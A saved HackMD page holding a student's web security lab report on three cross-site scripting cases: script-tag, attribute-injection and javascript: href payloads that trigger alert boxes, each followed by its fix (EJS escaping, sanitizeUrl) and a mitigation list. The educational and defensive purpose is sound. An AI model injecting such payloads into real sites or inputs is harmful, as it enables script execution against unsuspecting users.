@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>
+        AS Lab 2 - Web Security - HackMD
+    </title>
+    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
+    <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha256-916EbMg70RQy9LHiGkXzG8hSg9EdNy97GazNG/aiY1w=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/octicons/3.5.0/octicons.min.css" integrity="sha256-QiWfLIsCT02Sdwkogf6YMiQlj4NE84MKkzEMkZnMGdg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@hackmd/emojify.js@2.1.0/dist/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
+    <style>
+        @import url(https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i|Source+Code+Pro:300,400,500|Source+Sans+Pro:300,300i,400,400i,600,600i|Source+Serif+Pro&subset=latin-ext);.hljs{display:block;background:#fff;padding:.5em;color:#333;overflow-x:auto}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-string,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#a71d5d}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#0086b3}.hljs-built_in,.hljs-builtin-name{color:#005cc5}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#795da3}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.markdown-body{font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e7e7e7;border:0}.markdown-body blockquote{font-size:16px;padding:0 1em;color:#777;border-left:.25em solid #ddd}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body kbd,.popover kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid #ccc;border-bottom-color:#bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#000;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#777}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{padding-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:0;padding-top:.2em;padding-bottom:.2em;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\00a0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:12px;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0 none}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important;position:relative}.markdown-body .emoji{vertical-align:top}.markdown-body pre{border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.markdown-body code[data-gist-id]{background:none;padding:0}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{overflow:unset;margin-bottom:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p:last-child{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram,.markdown-body pre.vega{text-align:center;background-color:inherit;border-radius:0;white-space:inherit;overflow:visible}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code,.markdown-body pre.vega>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg,.markdown-body pre.vega>svg{max-width:100%;height:100%}.markdown-body pre>code.wrap{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}.markdown-body .alert>p:last-child,.markdown-body .alert>ul:last-child{margin-bottom:0}.markdown-body summary{display:list-item}.markdown-body summary:focus{outline:none}.markdown-body details summary{cursor:pointer}.markdown-body details:not([open])>:not(summary){display:none}.markdown-body figure{margin:1em 40px}.markdown-body .mark,.markdown-body mark{background-color:#fff1a7}.vimeo,.youtube{cursor:pointer;display:table;text-align:center;background-position:50%;background-repeat:no-repeat;background-size:contain;background-color:#000;overflow:hidden}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{width:100%;height:100%;position:absolute;top:0;left:0}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;opacity:.3;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}.figma{display:table;position:relative;width:100%;padding-bottom:56.25%}.figma iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%;border:1px solid #eee}.markmap-container{height:300px}.markmap-container>svg{width:100%;height:100%}.MJX_Assistive_MathML{display:none}#MathJax_Message{z-index:1000!important}.ui-infobar{position:relative;z-index:2;max-width:760px;margin:25px auto -25px;color:#777}.toc .invisable-node{list-style-type:none}.ui-toc{position:fixed;bottom:20px;z-index:998}.ui-toc.both-mode{margin-left:8px}.ui-toc.both-mode .ui-toc-label{height:40px;padding:10px 4px;border-top-left-radius:0;border-bottom-left-radius:0}.ui-toc-label{background-color:#e6e6e6;border:none;color:#868686;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#fff;transition:opacity .2s}.ui-toc-label:focus{opacity:.3;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;transition:opacity .2s}.ui-toc-dropdown{margin-top:20px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:70vh;overflow:auto;text-align:inherit}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li:first-child:last-child>ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,sans-serif}html[lang^=ja] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}html .markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html .markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html .markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}html[lang^=ja] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ\ Ｐゴシック,sans-serif}html[lang=zh-tw] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html[lang=zh-cn] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}html .ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ\ Ｐゴシック,sans-serif}html .ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html .ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.expand-toggle,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:12px;font-weight:500;color:#999}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;display:block;border-radius:50%;margin-top:2px;margin-bottom:2px;margin-right:5px;background-position:50%;background-repeat:no-repeat;background-size:cover}.ui-user-icon.small{width:18px;height:18px;display:inline-block;vertical-align:middle;margin:0 0 .2em}.ui-infobar>small>span{line-height:22px}.ui-infobar>small .dropdown{display:inline-block}.ui-infobar>small .dropdown a:focus,.ui-infobar>small .dropdown a:hover{text-decoration:none}.ui-more-info{color:#888;cursor:pointer;vertical-align:middle}.ui-more-info .fa{font-size:16px}.ui-connectedGithub,.ui-published-note{color:#888}.ui-connectedGithub{line-height:23px;white-space:nowrap}.ui-connectedGithub a.file-path{color:#888;text-decoration:none;padding-left:22px}.ui-connectedGithub a.file-path:active,.ui-connectedGithub a.file-path:hover{color:#888;text-decoration:underline}.ui-connectedGithub .fa{font-size:20px}.ui-published-note .fa{font-size:20px;vertical-align:top}.unselectable{-webkit-user-select:none;-o-user-select:none;user-select:none}.selectable{-webkit-user-select:text;-o-user-select:text;user-select:text}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{position:relative;z-index:1;color:#222}.markdown-body.slides:before{content:"";display:block;position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;background-color:currentColor;box-shadow:0 0 0 50vw}.markdown-body.slides section[data-markdown]{position:relative;margin-bottom:1.5em;background-color:#fff;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{position:absolute;top:50%;left:1em;right:1em;transform:translateY(-50%);max-height:100%;overflow:hidden}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{content:"";position:absolute;top:-1.5em;right:1em;height:1.5em;border:3px solid #777}.site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,sans-serif}html[lang^=ja] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:0 0 1em transparent,1px 1px 1.2px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;letter-spacing:.025em;font-family:Source Sans Pro,Helvetica,Arial,sans-serif}html[lang^=ja] body{font-family:Source Sans Pro,Helvetica,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}abbr[data-original-title],abbr[title]{cursor:help}body.modal-open{overflow-y:auto;padding-right:0!important}
+    </style>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
+    <![endif]-->
+</head>
+
+<body>
+    <div id="doc" class="markdown-body container-fluid comment-enabled" data-hard-breaks="true"><h1 id="AS-Lab-2---Web-Security" data-id="AS-Lab-2---Web-Security"><a class="anchor hidden-xs" href="#AS-Lab-2---Web-Security" title="AS-Lab-2---Web-Security"><span class="octicon octicon-link"></span></a><span>AS Lab 2 - Web Security</span></h1><p><strong><span>Name: Vladimir Shelkovnikov</span></strong></p><hr><h2 id="Cross-site-scripting" data-id="Cross-site-scripting"><a class="anchor hidden-xs" href="#Cross-site-scripting" title="Cross-site-scripting"><span class="octicon octicon-link"></span></a><span>Cross-site scripting</span></h2><p><span>This is a web page with an input field and a submit button (Figure 1). It takes a value from the input data and shows it on the page (Figure 2).</span></p><center>
+<p><img src="https://i.imgur.com/TOIHVSM.png" alt="" loading="lazy"><br>
+<span>Figure 1 - Web page</span></p>
+<p><img src="https://i.imgur.com/ifekAFV.png" alt="" loading="lazy"><br>
+<span>Figure 2 - On POST render the index page</span></p>
+</center><p><span>A classic example of XSS is the alert command. Let’s put it in the input field and submit it(Figure 3).</span></p><center>
+<p><img src="https://i.imgur.com/SNexaC3.png" alt="" loading="lazy"><br>
+<span>Figure 3 - </span><strong>&lt;script&gt;<span>alert(“XSS”)</span>&lt;/script&gt;</strong></p>
+</center><p><span>The main reason for this is the lack of validation of input data. In index.ejs it enters the input data as a string without any validation, as shown in Figure 4.</span></p><center>
+<p><img src="https://i.imgur.com/LjndSzB.png" alt="" loading="lazy"><br>
+<span>Figure 4 - Lack of validation</span></p>
+</center><p><span>To fix this, I changed </span><strong><span>&lt;%-</span></strong><span> to the </span><strong><span>&lt;%=</span></strong><span>. So this time I can’t execute this command (Figure 5).</span></p><div class="alert alert-info">
+<p><span>&lt;%- Outputs the unescaped value into the template</span><br>
+<span>&lt;%= Outputs the value into the template (HTML escaped)</span></p>
+</div><center>
+<p><img src="https://i.imgur.com/0OWpWvZ.png" alt="" loading="lazy"><br>
+<span>Figure 5 - XSS does not work</span></p>
+</center><h2 id="Cross-site-scripting-attribute" data-id="Cross-site-scripting-attribute"><a class="anchor hidden-xs" href="#Cross-site-scripting-attribute" title="Cross-site-scripting-attribute"><span class="octicon octicon-link"></span></a><span>Cross site scripting (attribute)</span></h2><p><span>It has a similar interface (Figure 6).</span></p><center>
+<p><img src="https://i.imgur.com/gQOOoOB.png" alt="" loading="lazy"><br>
+<span>Figure 6 - Web page</span></p>
+</center><p><span>I can interact with the input and the button. I can put a value there for the text color (red, #ff0000, etc). To set up this, it should use </span><strong><span>color=‘color’</span></strong><span>. So I can close it by using </span><strong><span>’</span></strong><span> and add a new attribute - </span><strong><span>yellow ’ onclick=‘alert(“Hello there”)’</span></strong><span> (Figure 7).</span></p><center>
+<p><img src="https://i.imgur.com/zp23ozs.png" alt="" loading="lazy"><br>
+<span>Figure 7 - XSS with attribute</span></p>
+</center><p><span>There is the same problem as before - the lack of verification:</span><br>
+<code>&lt;span style='color: &lt;%- xss %&gt;' &gt; Let me be a new color!&lt;/span&gt;</code><span>.</span></p><p><span>I’m changing </span><strong><span>&lt;%-</span></strong><span> to </span><strong><span>&lt;%=</span></strong><span> again. Then I can still change the color (Figure 8), but I can’t add a new attribute (Figure 9).</span></p><center>
+<p><img src="https://i.imgur.com/aQXopgu.png" alt="" loading="lazy"><br>
+<span>Figure 8 - Still capable to change color</span></p>
+<p><img src="https://i.imgur.com/lGNgy7X.png" alt="" loading="lazy"><br>
+<span>Figure 9 - XSS is prevented</span></p>
+</center><h2 id="Cross-site-scripting-href" data-id="Cross-site-scripting-href"><a class="anchor hidden-xs" href="#Cross-site-scripting-href" title="Cross-site-scripting-href"><span class="octicon octicon-link"></span></a><span>Cross site scripting (href)</span></h2><p><span>A page of the same type (Fig. 10). The data from the input field is used in the </span><strong><span>a</span></strong><span> element as an href.</span></p><center>
+<p><img src="https://i.imgur.com/wVU37Mj.png" alt="" loading="lazy"><br>
+<span>Figure 10 - Web page</span></p>
+</center><p><span>It looks like it puts the data from the input data into the href. We can run js via href using </span><strong><span>javascript:</span></strong><span>. I set it to </span><strong><span>javascript:alert(‘XSS’)</span></strong><span> as shown in Figure 11.</span></p><center>
+<p><img src="https://i.imgur.com/QE5cxIH.png" alt="" loading="lazy"><br>
+<span>Figure 11 - XSS with href</span></p>
+</center><p><span>To fix this, I need to validate the input data, and I can’t do it the way I did before. To do this, I used </span><strong><span>sanitizeUrl</span></strong><span>, as shown in Figure 12.</span></p><center>
+<p><img src="https://i.imgur.com/cO6OXTL.png" alt="" loading="lazy"><br>
+<span>Figure 12 - Corrections in the code</span></p>
+</center><p><span>So now it won’t execute </span><strong><span>javascript:</span></strong><span> instead it will replace it with about:blank (Figure 13).</span></p><center>
+<p><img src="https://i.imgur.com/fWU7UOq.png" alt="" loading="lazy"><br>
+<span>Figure 13 - XSS is prevented</span></p>
+</center><p><span>Here is a small conclusion on XSS attacks mitigation:</span></p><ol>
+<li><span>Sanitize input on arrival.</span></li>
+<li><span>Encode data on output.</span></li>
+<li><span>Use appropriate response headers. To prevent XSS in HTTP responses that aren’t intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.</span></li>
+<li><span>Content Security Policy.</span></li>
+<li><span>Cookie Attributes.</span></li>
+<li><span>WAF.</span></li>
